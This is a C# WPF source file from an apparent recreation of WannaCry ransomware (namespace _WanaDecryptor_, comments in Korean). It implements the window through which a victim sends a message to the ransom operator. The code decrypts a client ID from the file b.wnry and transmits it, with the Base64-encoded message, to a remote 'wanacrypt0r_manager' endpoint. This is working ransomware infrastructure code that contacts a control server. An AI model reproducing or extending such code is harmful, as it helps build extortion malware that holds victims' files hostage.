using _WanaDecryptor_.Utils.Crypto;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace _WanaDecryptor_
{
    /// <summary>
    /// SendMessage.xaml에 대한 상호 작용 논리
    /// </summary>
    public partial class SendMessage : Window
    {
        /// <summary>
        /// 생성자
        /// </summary>
        public SendMessage()
        {
            InitializeComponent();
        }



        /// <summary>
        /// 창 닫기 버튼 클릭 이벤트
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CancelButton_Click(object sender, RoutedEventArgs e)
        {
            this.Close();
        }



        /// <summary>
        /// 메시지 전송 버튼 클릭
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void SendButton_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                string context = new TextRange(MessageContext.Document.ContentStart, MessageContext.Document.ContentEnd).Text;

                await Task.Run(() => 
                {
                    try
                    {
                        AESManager aESManager = new AESManager();
                        WebClient webClient = new WebClient();
                        webClient.DownloadString(
                            string.Format(
                                "https://rhya-network.kro.kr/RhyaNetwork/wanacrypt0r_manager?mode=2&clientid={0}&message={1}",
                                JObject.Parse(aESManager.TextAESDecrypt(File.ReadAllText("b.wnry")))["client_id"],
                                HttpUtility.UrlEncode(Convert.ToBase64String(Encoding.UTF8.GetBytes(context)), Encoding.UTF8)));
                        webClient.Dispose();
                    }
                    catch (Exception)
                    {
                        // 예외 발생
                        MessageBox.Show("메시지 전송 중 알 수 없는 오류가 발생하였습니다.", "@WanaDecrypt0r@", MessageBoxButton.OK, MessageBoxImage.Error);
                    }
                });

                this.Close();
            }
            catch (Exception) { }
        }
    }
}
